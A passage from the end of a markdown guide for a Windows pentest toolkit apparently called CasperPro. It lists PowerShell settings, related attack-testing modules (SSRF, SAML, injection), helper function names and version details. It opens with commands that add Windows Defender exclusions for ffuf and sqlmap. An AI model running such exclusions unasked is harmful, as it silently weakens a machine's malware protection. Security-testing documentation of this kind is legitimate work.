Add-MpPreference -ExclusionProcess "ffuf.exe"
Add-MpPreference -ExclusionProcess "sqlmap.py"
```

### 4. Performance Optimization

```powershell
# Increase concurrent connections
[System.Net.ServicePointManager]::DefaultConnectionLimit = 100

# Use HTTP/2 where supported
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
```

## Advanced Testing Modules

For comprehensive testing beyond basic security checks, refer to these dedicated modules:

### Business Logic Testing
See **casperpro-business-logic-advanced.md** for:
- Financial transaction testing (negative amounts, precision, currency, replay)
- E-commerce logic (price manipulation, coupons, race conditions)
- Workflow/state machine testing
- Multi-tenant isolation testing

### Edge Cases and Hard-to-Find Issues
See **casperpro-edge-cases.md** for:
- Type juggling and coercion attacks
- Unicode normalization bypasses
- Mass assignment vulnerabilities
- HTTP parameter pollution
- Prototype pollution
- ReDoS testing

### Enterprise Technology Testing
See **casperpro-enterprise-tech.md** for:
- LDAP injection
- SAML/SSO attacks
- OAuth/OIDC vulnerabilities
- GraphQL enterprise attacks
- Message queue injection
- Document generation SSRF
- Webhook SSRF

## PowerShell Quick Reference

### Basic Security Testing Functions

The following PowerShell functions provide Windows-native security testing:

```powershell
# Load all CasperPro functions
. $env:USERPROFILE\casper-pentest\casper-functions.ps1

# Quick reference:
# Invoke-CasperRequest     - HTTP client wrapper
# Invoke-CasperParallel    - Parallel requests
# Start-CasperProxy        - Start mitmproxy
# Test-CasperIDOR          - IDOR testing  
# Test-CasperJWT           - JWT attacks
# Test-CasperInjection     - Injection testing
# Test-CasperRaceCondition - Race condition testing
```

## Version Information

**Module Version:** 2.0  
**CasperPro Version:** 2.2  
**Platform:** Windows 10/11, Windows Server 2019+  
**PowerShell:** 7.0+  
**Python Package Manager:** uv (REQUIRED)  
**Last Updated:** 2026-01-11

### Related Modules

| Module | Description |
|--------|-------------|
| casperpro-business-logic-advanced.md | Financial, e-commerce, workflow, multi-tenant |
| casperpro-edge-cases.md | Type juggling, unicode, mass assignment, HPP, proto pollution |
| casperpro-enterprise-tech.md | LDAP, SAML, OAuth, GraphQL, MQ, webhooks |
